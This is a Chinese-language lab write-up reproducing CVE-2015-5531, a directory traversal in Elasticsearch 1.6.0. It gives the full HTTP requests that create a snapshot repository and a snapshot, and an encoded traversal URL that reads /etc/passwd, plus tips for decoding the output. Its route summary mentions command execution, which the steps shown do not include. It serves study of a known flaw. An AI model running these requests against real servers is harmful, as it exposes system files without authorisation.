# ElasticSearch 目录穿越漏洞（CVE-2015-5531）

###### by ADummy

### 0x00利用路线

​			Burpsuite抓包--->java代码放入json--->有回显命令执行

### 0x01漏洞介绍

​			**说明：**

**elasticsearch 1.5.1及以前，无需任何配置即可触发该漏洞。之后的新版，配置文件elasticsearch.yml中必须存在`path.repo`，该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能**。

```
jre版本：openjdk:8-jre

elasticsearch版本：v1.6.0

影响版本：1.6.1以下
```

### 0x02漏洞复现

新建一个仓库

```
PUT /_snapshot/test HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 108

{
    "type": "fs",
    "settings": {
        "location": "/usr/share/elasticsearch/repo/test" 
    }
}
```

![ElasticSearch_目录穿越漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ElasticSearch_目录穿越漏洞_1.jpg)



新建一个快照

```
PUT /_snapshot/test2 HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 108

{
    "type": "fs",
    "settings": {
        "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata" 
    }
}
```

![ElasticSearch_目录穿越漏洞_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ElasticSearch_目录穿越漏洞_2.jpg)



访问http://your-ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

目录穿越导致任意读取文件

![ElasticSearch_目录穿越漏洞_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ElasticSearch_目录穿越漏洞_3.jpg)

可以用工具进行转换，或者直接使用Chrome-右键-检查-Console，输入**String.fromCharCode(ASCII码)**，执行结果如下：

![ElasticSearch_目录穿越漏洞_4](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ElasticSearch_目录穿越漏洞_4.jpg)



### 0x03参考资料

https://www.cnblogs.com/qianxiao996/p/13574645.html

